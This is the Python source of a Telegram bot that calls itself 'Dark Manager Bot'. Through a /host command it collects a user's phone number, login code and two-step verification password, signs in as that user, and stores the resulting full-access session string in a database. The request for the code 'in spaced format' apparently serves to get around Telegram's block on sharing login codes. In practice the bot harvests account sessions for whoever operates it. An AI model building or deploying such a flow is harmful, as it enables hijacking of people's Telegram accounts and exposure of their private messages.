import os, asyncio, re
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import (
    ApiIdInvalidError,
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    PasswordHashInvalidError
)
from config import API_ID, API_HASH, BOT_TOKEN, START_MSG, LOGIN_SUCCESS
from database import save_session

# Manager Bot Client
bot = TelegramClient('manager_bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Temporary storage for login data
user_data = {}

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    await event.reply(START_MSG, parse_mode='md')

@bot.on(events.NewMessage(pattern='/host'))
async def host_handler(event):
    async with bot.conversation(event.chat_id) as conv:
        await conv.send_message("📲 **Please send your Phone Number with Country Code.**\nExample: `+919876543210`")
        
        number = await conv.get_response()
        phone_number = number.text.replace(" ", "")
        
        # Start Telethon Client for the user
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            code_request = await client.send_code_request(phone_number)
        except PhoneNumberInvalidError:
            await conv.send_message("❌ **Invalid Phone Number.** Restart /host.")
            return

        await conv.send_message("📩 **OTP sent to your Telegram.**\nPlease send the OTP in spaced format: `1 2 3 4 5`")
        
        otp_res = await conv.get_response()
        otp = otp_res.text.replace(" ", "") # Removing spaces from 1 2 3 4 5

        try:
            await client.sign_in(phone_number, otp, password=None)
        except SessionPasswordNeededError:
            await conv.send_message("🔐 **Two-Step Verification detected.** Please send your password.")
            password_res = await conv.get_response()
            try:
                await client.sign_in(password=password_res.text)
            except PasswordHashInvalidError:
                await conv.send_message("❌ **Wrong Password.** Restart /host.")
                return
        except (PhoneCodeInvalidError, PhoneCodeExpiredError):
            await conv.send_message("❌ **Invalid or Expired OTP.** Restart /host.")
            return

        # Success: Generate String Session
        string_session = client.session.save()
        user_id = (await client.get_me()).id
        
        # Save to MongoDB
        await save_session(user_id, string_session)
        
        await conv.send_message(LOGIN_SUCCESS)
        await client.disconnect()

print("Dark Manager Bot is Running...")
bot.run_until_disconnected()
  
